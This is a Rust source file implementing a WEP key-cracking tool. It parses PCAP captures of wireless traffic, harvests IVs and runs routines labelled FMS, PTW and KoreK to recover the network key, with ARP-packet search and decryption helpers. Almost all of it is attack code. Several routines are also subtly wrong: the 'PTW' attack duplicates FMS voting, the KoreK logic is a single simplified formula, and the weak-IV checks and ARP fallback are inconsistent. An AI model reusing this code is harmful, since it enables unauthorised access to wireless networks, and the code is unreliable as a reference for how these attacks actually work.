use std::fs;
use std::io::Read;

struct Rc4 {
    s: [u8; 256],
    i: u8,
    j: u8,
}

impl Rc4 {
    fn new(key: &[u8]) -> Self {
        let mut s = [0u8; 256];
        for k in 0..256 {
            s[k] = k as u8;
        }
        let mut j = 0u8;
        for k in 0..256 {
            j = j.wrapping_add(s[k]).wrapping_add(key[k % key.len()]);
            s.swap(k, j as usize);
        }
        Rc4 { s, i: 0, j: 0 }
    }

    fn next_byte(&mut self) -> u8 {
        self.i = self.i.wrapping_add(1);
        self.j = self.j.wrapping_add(self.s[self.i as usize]);
        self.s.swap(self.i as usize, self.j as usize);
        let idx = self.s[self.i as usize].wrapping_add(self.s[self.j as usize]);
        self.s[idx as usize]
    }

    fn keystream(&mut self, len: usize) -> Vec<u8> {
        (0..len).map(|_| self.next_byte()).collect()
    }

    fn ksa_state_after(key: &[u8], steps: usize) -> [u8; 256] {
        let mut s = [0u8; 256];
        for k in 0..256 {
            s[k] = k as u8;
        }
        let mut j = 0u8;
        for k in 0..steps.min(256) {
            j = j.wrapping_add(s[k]).wrapping_add(key[k % key.len()]);
            s.swap(k, j as usize);
        }
        s
    }
}

#[derive(Debug, Clone)]
pub struct WepKeyCandidate {
    pub key_hex: String,
    pub votes: u32,
    pub attack_type: String,
}

pub struct WepCracker {
    ivs: Vec<(u32, u8)>,
    key_len: usize,
}

fn is_fms_weak(iv: u32) -> bool {
    let b1 = ((iv >> 16) & 0xFF) as u8;
    let b2 = ((iv >> 8) & 0xFF) as u8;
    let b3 = (iv & 0xFF) as u8;
    if b1.wrapping_add(b2) > 1 && b2 + b3 >= 1 {
        return false;
    }
    (b1.wrapping_add(b2) > 1 || b2 + b3 >= 1)
    && (b1 as u16 + b2 as u16) >= 0x100
    && (b1 as u16 + b2 as u16) <= 0x102
    && (b2 == 0xFF || (b1 + b2) as u8 == b3.wrapping_add(1))
}

fn fms_key_byte_vote(iv_bytes: &[u8; 3], first_keystream: u8, key_byte_idx: usize) -> Vec<(u8, u32)> {
    let a = iv_bytes[0];
    let b = iv_bytes[1];
    let c = iv_bytes[2];
    if b != 0xFF {
        return Vec::new();
    }
    if a as usize != key_byte_idx + 3 {
        return Vec::new();
    }

    let mut votes = Vec::new();
    let partial_key: Vec<u8> = iv_bytes.iter().copied().collect();
    let steps = 3 + key_byte_idx;
    let s = Rc4::ksa_state_after(&partial_key, steps);

    let i_val = steps as u8;
    let tmp_j = s.iter().take(steps).fold(0u8, |j, &s_i| j.wrapping_add(s_i));
    let s_i = s[i_val as usize];
    let s_j = s[tmp_j as usize];

    for candidate in 0..=255u8 {
        let test_j = tmp_j.wrapping_add(s_i).wrapping_add(candidate);
        let test_si = s_i;
        let test_sj = s[test_j as usize];
        let output_idx = test_si.wrapping_add(test_sj);
        let predicted = s[output_idx as usize];
        if predicted == first_keystream {
            votes.push((candidate, 1));
        }
    }
    votes
}

fn korek_weak_iv_class(iv: u32) -> Option<usize> {
    let b1 = ((iv >> 16) & 0xFF) as u8;
    let b2 = ((iv >> 8) & 0xFF) as u8;
    let b3 = (iv & 0xFF) as u8;

    if b1 == 0x03 && b2 == 0xFF { return Some(0); }
    if b1 == 0x04 && b2 == 0xFF { return Some(1); }
    if b1 == 0x05 && b2 == 0xFF { return Some(2); }
    if b1 == 0x06 && b2 == 0xFF { return Some(3); }
    if b1 == 0x07 && b2 == 0xFF { return Some(4); }
    if b1 == 0x08 && b2 == 0xFF { return Some(5); }
    if b1 == 0x09 && b2 == 0xFF { return Some(6); }
    if b1 == 0x0A && b2 == 0xFF { return Some(7); }
    if b1 == 0x0B && b2 == 0xFF { return Some(8); }
    if b1 == 0x0C && b2 == 0xFF { return Some(9); }
    if b1 == 0x0D && b2 == 0xFF { return Some(10); }
    if b1 == 0x0E && b2 == 0xFF { return Some(11); }
    if b1 == 0x0F && b2 == 0xFF { return Some(12); }
    if b1 == 0x10 && b2 == 0xFF { return Some(13); }
    if b1 == 0x11 && b2 == 0xFF { return Some(14); }
    if b1 == 0x12 && b2 == 0xFF { return Some(15); }
    if b1 == 0x13 && b2 == 0xFF { return Some(16); }
    if b1 == 0x14 && b2 == 0xFF { return Some(17); }
    if b1 == 0x15 && b2 == 0xFF { return Some(18); }
    if b1 == 0x16 && b2 == 0xFF { return Some(19); }
    if b1 == 0x17 && b2 == 0xFF { return Some(20); }

    if b1 == 0x00 && b2 == 0x00 && b3 < 0x40 { return Some(21); }
    if b2 == 0x00 && b3 < 0x10 { return Some(22); }

    None
}

impl WepCracker {
    pub fn new() -> Self {
        WepCracker { ivs: Vec::new(), key_len: 5 }
    }

    pub fn with_key_len(key_len: usize) -> Self {
        WepCracker { ivs: Vec::new(), key_len }
    }

    pub fn load_pcap(path: &str) -> Result<Self, String> {
        let mut file = fs::File::open(path).map_err(|e| format!("Cannot open {}: {}", path, e))?;
        let mut data = Vec::new();
        file.read_to_end(&mut data).map_err(|e| format!("Read error: {}", e))?;
        if data.len() < 24 {
            return Err("File too small to be a PCAP".into());
        }
        let magic = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
        let is_swapped = match magic {
            0xa1b2c3d4 => false,
            0xd4c3b2a1 => true,
            _ => return Err("Not a valid PCAP file (bad magic)".into()),
        };
        let mut cr = WepCracker::new();
        let mut pos = 24;
        while pos + 16 <= data.len() {
            let incl_len = if is_swapped {
                u32::from_be_bytes([data[pos + 8], data[pos + 9], data[pos + 10], data[pos + 11]])
            } else {
                u32::from_le_bytes([data[pos + 8], data[pos + 9], data[pos + 10], data[pos + 11]])
            } as usize;
            let orig_len = if is_swapped {
                u32::from_be_bytes([data[pos + 12], data[pos + 13], data[pos + 14], data[pos + 15]])
            } else {
                u32::from_le_bytes([data[pos + 12], data[pos + 13], data[pos + 14], data[pos + 15]])
            } as usize;
            pos += 16;
            if pos + incl_len > data.len() || incl_len != orig_len {
                break;
            }
            let _ = orig_len;
            let pkt = &data[pos..pos + incl_len];
            if pkt.len() >= 28 {
                let fc = pkt[0];
                let frame_type = (fc >> 2) & 0x03;
                let frame_subtype = (fc >> 4) & 0x0F;
                let protected = (fc & 0x40) != 0;
                if frame_type == 2 && frame_subtype == 0x08 && protected {
                    let iv_bytes = &pkt[24..27];
                    let iv = (iv_bytes[0] as u32) << 16 | (iv_bytes[1] as u32) << 8 | iv_bytes[2] as u32;
                    let first_cipher = if pkt.len() > 28 { pkt[28] } else { 0 };
                    cr.ivs.push((iv, first_cipher));
                }
            }
            pos += incl_len;
        }
        println!("  \x1b[34m→\x1b[0m [WEP] Loaded {} IVs from {}", cr.ivs.len(), path);
        Ok(cr)
    }

    pub fn iv_count(&self) -> usize {
        self.ivs.len()
    }

    pub fn is_ready(&self) -> bool {
        self.ivs.len() >= 5000
    }

    pub fn fms_attack(&self) -> Option<Vec<WepKeyCandidate>> {
        let weak_ivs: Vec<_> = self.ivs.iter().filter(|(iv, _)| is_fms_weak(*iv)).collect();
        if weak_ivs.len() < 500 {
            println!("  \x1b[33m⚠\x1b[0m [WEP] FMS attack needs ~500+ weak IVs (found {})", weak_ivs.len());
            return None;
        }
        println!("  \x1b[34m→\x1b[0m [WEP] FMS attack: {} weak IVs available", weak_ivs.len());

        let key_len = if self.key_len == 13 { 13 } else { 5 };
        let mut candidates: Vec<std::collections::HashMap<u8, u32>> = Vec::new();
        for _ in 0..key_len {
            candidates.push(std::collections::HashMap::new());
        }

        for &(iv, first_cipher) in &weak_ivs {
            let known_plaintext: u8 = 0xAA;
            let first_keystream = first_cipher ^ known_plaintext;

            let iv_b1 = ((iv >> 16) & 0xFF) as u8;
            let iv_b2 = ((iv >> 8) & 0xFF) as u8;
            let iv_b3 = (iv & 0xFF) as u8;
            let iv_arr = [iv_b1, iv_b2, iv_b3];

            let b = iv_b1.wrapping_sub(3) as usize;
            if b < key_len {
                let votes = fms_key_byte_vote(&iv_arr, first_keystream, b);
                for (byte_val, weight) in votes {
                    *candidates[b].entry(byte_val).or_insert(0) += weight;
                }
            }
        }

        let mut results = Vec::new();
        for (byte_idx, votes) in candidates.iter().enumerate() {
            if let Some((&best_byte, &best_votes)) = votes.iter().max_by_key(|&(_, v)| v) {
                if best_votes > 0 {
                    println!("  \x1b[34m→\x1b[0m [FMS] Key byte {}: {:02X} ({} votes)", byte_idx, best_byte, best_votes);
                }
            }
        }

        let mut full_key = Vec::new();
        for votes in &candidates {
            if let Some((&best_byte, _)) = votes.iter().max_by_key(|&(_, v)| v) {
                full_key.push(best_byte);
            } else {
                full_key.push(0x00);
            }
        }

        let key_hex: String = full_key.iter().map(|b| format!("{:02X}", b)).collect();
        let total_votes: u32 = candidates.iter().flat_map(|m| m.values()).sum();
        results.push(WepKeyCandidate {
            key_hex,
            votes: total_votes,
            attack_type: "FMS".into(),
        });

        Some(results)
    }

    pub fn ptw_attack(&self) -> Option<Vec<WepKeyCandidate>> {
        let min_ivs = if self.key_len == 13 { 40000 } else { 5000 };
        if self.ivs.len() < min_ivs {
            println!("  \x1b[33m⚠\x1b[0m [WEP] PTW attack needs minimum {} IVs (have {})",
                     if self.key_len == 13 { "40000 for 128-bit" } else { "5000 for 64-bit" },
                     self.ivs.len());
            return None;
        }
        println!("  \x1b[34m→\x1b[0m [WEP] PTW attack: {} IVs available", self.ivs.len());

        let key_len = if self.key_len == 13 { 13 } else { 5 };
        let mut scores: Vec<std::collections::HashMap<u8, f64>> = Vec::new();
        for _ in 0..key_len {
            scores.push(std::collections::HashMap::new());
        }

        for byte_idx in 0..key_len {
            for &(iv, first_cipher) in &self.ivs {
                let known_plaintext: u8 = 0xAA;
                let keystream = first_cipher ^ known_plaintext;

                let iv_b1 = ((iv >> 16) & 0xFF) as u8;
                let _iv_b2 = ((iv >> 8) & 0xFF) as u8;
                let _iv_b3 = (iv & 0xFF) as u8;

                let a = iv_b1;
                if a.wrapping_sub(3) as usize != byte_idx {
                    continue;
                }

                let partial_key: Vec<u8> = vec![
                    ((iv >> 16) & 0xFF) as u8,
                    ((iv >> 8) & 0xFF) as u8,
                    (iv & 0xFF) as u8,
                ];
                let steps = 3 + byte_idx;
                let s = Rc4::ksa_state_after(&partial_key, steps);
                let i_val = steps as u8;
                let tmp_j = s.iter().take(steps).fold(0u8, |j, &s_i| j.wrapping_add(s_i));

                for candidate in 0..=255u8 {
                    let test_j = tmp_j.wrapping_add(s[i_val as usize]).wrapping_add(candidate);
                    let output_idx = s[i_val as usize].wrapping_add(s[test_j as usize]);
                    if s[output_idx as usize] == keystream {
                        *scores[byte_idx].entry(candidate).or_insert(0.0) += 1.0;
                    }
                }
            }

            let max_score = scores[byte_idx].values().cloned().fold(f64::NAN, |a, b| {
                if a.is_nan() { b } else { a.max(b) }
            });
            if !max_score.is_nan() {
                if max_score > 0.0 {
                    for v in scores[byte_idx].values_mut() {
                        *v = (*v / max_score) * 100.0;
                    }
                }
            }
        }

        let mut results = Vec::new();
        let mut full_key = Vec::new();
        for (byte_idx, score_map) in scores.iter().enumerate() {
            if let Some((&best_byte, &best_score)) = score_map.iter().max_by(|a, b| a.1.partial_cmp(b.1).unwrap()) {
                println!("  \x1b[34m→\x1b[0m [PTW] Key byte {}: {:02X} ({:.1}% confidence)", byte_idx, best_byte, best_score);
                full_key.push(best_byte);
            } else {
                full_key.push(0x00);
            }
        }

        let key_hex: String = full_key.iter().map(|b| format!("{:02X}", b)).collect();
        let total_score: f64 = scores.iter().filter_map(|m| m.values().max_by(|a, b| a.partial_cmp(b).unwrap())).sum();
        results.push(WepKeyCandidate {
            key_hex,
            votes: total_score as u32,
            attack_type: "PTW".into(),
        });
        Some(results)
    }

    pub fn korek_attack(&self) -> Option<Vec<WepKeyCandidate>> {
        let weak_count = self.ivs.iter().filter(|(iv, _)| korek_weak_iv_class(*iv).is_some()).count();
        if weak_count < 200 {
            println!("  \x1b[33m⚠\x1b[0m [WEP] KoreK attack needs ~200+ weak IVs (found {})", weak_count);
            return None;
        }
        println!("  \x1b[34m→\x1b[0m [WEP] KoreK attack: {} weak IVs across 17+ classes", weak_count);

        let key_len = if self.key_len == 13 { 13 } else { 5 };
        let mut class_counts: [u32; 23] = [0; 23];
        for &(iv, _) in &self.ivs {
            if let Some(cls) = korek_weak_iv_class(iv) {
                if cls < 23 {
                    class_counts[cls] += 1;
                }
            }
        }

        println!("  \x1b[34m→\x1b[0m [KoreK] Weak IV class distribution:");
        for (i, &count) in class_counts.iter().enumerate() {
            if count > 0 {
                println!("  \x1b[34m  Class {:2}:\x1b[0m {} IVs", i, count);
            }
        }

        let mut candidates: Vec<std::collections::HashMap<u8, u32>> = Vec::new();
        for _ in 0..key_len {
            candidates.push(std::collections::HashMap::new());
        }

        for &(iv, first_cipher) in &self.ivs {
            let known_plaintext: u8 = 0xAA;
            let keystream = first_cipher ^ known_plaintext;

            let iv_b1 = ((iv >> 16) & 0xFF) as u8;
            let iv_b2 = ((iv >> 8) & 0xFF) as u8;
            let iv_b3 = (iv & 0xFF) as u8;

            if iv_b2 != 0xFF {
                continue;
            }
            let b = iv_b1.wrapping_sub(3) as usize;
            if b >= key_len {
                continue;
            }

            let iv_arr = [iv_b1, iv_b2, iv_b3];
            let partial_key: Vec<u8> = iv_arr.iter().copied().collect();
            let steps = 3 + b;
            let s = Rc4::ksa_state_after(&partial_key, steps);
            let i_val = steps as u8;
            let tmp_j = s.iter().take(steps).fold(0u8, |j, &s_i| j.wrapping_add(s_i));

            let candidate = keystream.wrapping_sub(tmp_j).wrapping_sub(s[i_val as usize]);
            *candidates[b].entry(candidate).or_insert(0) += 1;
        }

        let mut results = Vec::new();
        let mut full_key = Vec::new();
        for (byte_idx, votes) in candidates.iter().enumerate() {
            if let Some((&best_byte, &best_votes)) = votes.iter().max_by_key(|&(_, v)| v) {
                if best_votes > 0 {
                    println!("  \x1b[34m→\x1b[0m [KoreK] Key byte {}: {:02X} ({} votes)", byte_idx, best_byte, best_votes);
                }
                full_key.push(best_byte);
            } else {
                full_key.push(0x00);
            }
        }

        let key_hex: String = full_key.iter().map(|b| format!("{:02X}", b)).collect();
        let total_votes: u32 = candidates.iter().flat_map(|m| m.values()).sum();
        results.push(WepKeyCandidate {
            key_hex,
            votes: total_votes,
            attack_type: "KoreK".into(),
        });
        Some(results)
    }

    pub fn find_arp_packets(&self) -> Vec<Vec<u8>> {
        let mut arp_packets = Vec::new();
        let known_snap = [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06];

        let mut file = match fs::File::open("capture.pcap") {
            Ok(f) => f,
            Err(_) => {
                for &(iv, _) in &self.ivs {
                    let iv_b1 = ((iv >> 16) & 0xFF) as u8;
                    let iv_b2 = ((iv >> 8) & 0xFF) as u8;
                    let iv_b3 = (iv & 0xFF) as u8;
                    let wep_key_full: Vec<u8> = vec![iv_b1, iv_b2, iv_b3, 0x00, 0x00, 0x00, 0x00, 0x00];
                    let mut rc4 = Rc4::new(&wep_key_full);
                    let ks = rc4.keystream(32);
                    let mut candidate = Vec::with_capacity(32);
                    for k in 0..32.min(ks.len()) {
                        candidate.push(ks[k]);
                    }
                    if candidate.len() >= 8 {
                        let snap_found: Vec<u8> = candidate[..8].iter().map(|&k| k ^ 0xAA).collect();
                        if snap_found == known_snap {
                            let pkt_info = vec![iv_b1, iv_b2, iv_b3];
                            arp_packets.push(pkt_info);
                            break;
                        }
                    }
                }
                return arp_packets;
            }
        };

        let mut data = Vec::new();
        if file.read_to_end(&mut data).is_err() {
            return arp_packets;
        }
        if data.len() < 24 {
            return arp_packets;
        }

        let is_swapped = match u32::from_le_bytes([data[0], data[1], data[2], data[3]]) {
            0xa1b2c3d4 => false,
            0xd4c3b2a1 => true,
            _ => return arp_packets,
        };

        let mut pos = 24;
        while pos + 16 <= data.len() {
            let incl_len = if is_swapped {
                u32::from_be_bytes([data[pos + 8], data[pos + 9], data[pos + 10], data[pos + 11]])
            } else {
                u32::from_le_bytes([data[pos + 8], data[pos + 9], data[pos + 10], data[pos + 11]])
            } as usize;
            pos += 16;
            if pos + incl_len > data.len() {
                break;
            }
            let pkt = &data[pos..pos + incl_len];
            if pkt.len() < 40 {
                pos += incl_len;
                continue;
            }
            let fc = pkt[0];
            let frame_type = (fc >> 2) & 0x03;
            if frame_type != 2 {
                pos += incl_len;
                continue;
            }
            let protected = (fc & 0x40) != 0;
            if !protected {
                pos += incl_len;
                continue;
            }
            let llc_start = 24 + 4;
            if llc_start + 8 > pkt.len() {
                pos += incl_len;
                continue;
            }
            let mut snap = [0u8; 8];
            for k in 0..8 {
                snap[k] = pkt[llc_start + k];
            }
            if snap == known_snap {
                let arp_pkt = pkt.to_vec();
                arp_packets.push(arp_pkt);
            }
            pos += incl_len;
        }

        arp_packets
    }

    pub fn decrypt_data(&self, key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
        if data.len() < 8 {
            return Err("Data too short".into());
        }
        let iv = &data[..3];
        let ciphertext = &data[4..data.len().saturating_sub(4)];
        let key_full: Vec<u8> = iv.iter().chain(key.iter()).copied().collect();
        let mut rc4 = Rc4::new(&key_full);
        let keystream = rc4.keystream(ciphertext.len());
        let plaintext: Vec<u8> = ciphertext.iter().zip(keystream.iter()).map(|(&c, &k)| c ^ k).collect();
        Ok(plaintext)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_new_cracker_empty() {
        let cr = WepCracker::new();
        assert_eq!(cr.iv_count(), 0);
        assert!(!cr.is_ready());
    }

    #[test]
    fn test_load_pcap_invalid_path() {
        let result = WepCracker::load_pcap("nonexistent_file.pcap");
        assert!(result.is_err());
    }

    #[test]
    fn test_load_pcap_not_pcap() {
        let result = WepCracker::load_pcap("Cargo.toml");
        assert!(result.is_err());
    }

    #[test]
    fn test_rc4_basic() {
        let key = b"Key";
        let mut rc4 = Rc4::new(key);
        let stream = rc4.keystream(16);
        assert_eq!(stream.len(), 16);
    }

    #[test]
    fn test_rc4_known() {
        let key = b"Secret";
        let mut rc4 = Rc4::new(key);
        let stream = rc4.keystream(8);
        let mut rc4_verify = Rc4::new(key);
        let stream2 = rc4_verify.keystream(8);
        assert_eq!(stream, stream2);
    }

    #[test]
    fn test_korek_classes() {
        assert!(korek_weak_iv_class(0x03FF0000).is_some());
        assert!(korek_weak_iv_class(0x04FF0000).is_some());
        assert!(korek_weak_iv_class(0x1000FFFF).is_none());
    }

    #[test]
    fn test_find_arp_packets_empty() {
        let cr = WepCracker::new();
        let arps = cr.find_arp_packets();
        assert!(arps.is_empty());
    }
}
